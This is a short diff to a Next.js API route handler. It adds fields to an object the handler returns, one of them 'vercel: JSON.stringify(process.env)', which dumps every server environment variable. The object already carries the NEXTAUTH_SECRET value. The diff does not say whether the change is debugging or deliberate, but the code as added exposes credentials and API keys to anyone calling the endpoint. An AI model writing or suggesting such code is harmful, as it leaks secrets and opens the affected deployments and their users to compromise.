@@ -82,6 +82,8 @@ export default async (req: CurrentNextApiRequest, res: NextApiResponse) => {
 				auth,
 				method,
 				secret: process.env.NEXTAUTH_SECRET,
+				url: process.env.NEXTAUTH_URL,
+				vercel: JSON.stringify(process.env),
 				test: req.headers?.test
 			})
 		}
